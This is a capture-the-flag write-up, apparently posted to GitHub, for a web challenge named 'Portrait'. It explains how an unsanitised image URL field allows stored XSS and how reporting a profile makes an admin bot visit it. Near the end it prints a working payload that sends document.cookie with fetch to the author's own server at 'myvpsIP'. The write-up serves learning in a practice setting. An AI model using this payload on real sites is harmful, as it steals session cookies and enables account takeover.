![6](https://github.com/user-attachments/assets/cbb7b0e8-d9d7-4010-a96b-be6b24f7ba6b)**Web: Portrait:**

I found this challenge the toughest, and I think it explains why it had the lowest solves in this category at only 40! 

Anyway the description of the challenge
**"It's like DeviantArt, but with a report button to keep it less Deviant. Reporting a gallery will make the admin bot visit it."**

Again another register & login

Once we log in we have 3 options, Logout, Report a portrait, which by the description we know we will use this to have admin fetch something and Add portrait.
I first went to understand the program better, and see what exactly admin can fetch,
when I tried to add a link, it disclosed the regex used for input validation

![1](https://github.com/user-attachments/assets/77cbefcf-9aa1-47c4-a14f-4410e3cfc109)



I couldn't see a way to bypass this after trying for a couple minutes, I decided to drop it and move on and understand the function of adding a portrait

![2](https://github.com/user-attachments/assets/abffb076-572e-48e1-84e9-9ce678fd73fd)


**Title** and **Image URL are required** so lets take a look at source code to figure out how its processed

![3](https://github.com/user-attachments/assets/55567b83-0f27-4799-a178-ae2e1bbb40a7)


First I noticed this, which tries to fetch the url of our image, if it fails it will replace it with the mountain image linked in the code
within index.js i found  that portraits are stored and fetched from /api/portraits/:username

![4](https://github.com/user-attachments/assets/16f0db2f-3c69-4360-94ff-24de28cda6b1)

/
Below we can see the front end of gallery,again portrait is pulled from /api/portraits/<username>    and it has two attributes
**portrait.source** and **portrait.name** HOWEVER from the two we can see that portrait.source the attribute it uses is src= of the <img


![5](https://github.com/user-attachments/assets/2ae67314-8159-4b5d-8bc1-2694cb037b0a)



Since there was no validation or sanitization for this input, I knew i'd be dealing with a stored XSS, now I would love to tell you I tried a few payloads and boom, I got it to work, this took a very long time to figure out, I've tried so many until I got a hit on the below
**data:text/javascript,print()**

![6](https://github.com/user-attachments/assets/701b19fa-15cf-47e5-96e0-6831f993a1dd)


and boy was I delighted to see this work, next was to find a way to exfiltrate, I saw earlier that sessions are handled using JWT tokens, so I started up my own VPS server to use as a webhook and launched a http server to listen for traffic
the payload I used to exfiltrate the cookie was:

**data:text/javascript,fetch('http://myvpsIP:8080/' + document.cookie)**
Last all was left is to lead the admin "bot" to our profile, by going to report and leading it to my profile URL on the web application, the bot will visit and be met with the above stroed XSS

And there it was a response with the cookie "flag"![image](https://github.com/user-attachments/assets/b7c90163-2626-4fff-a7c0-14f9886ccc0a)
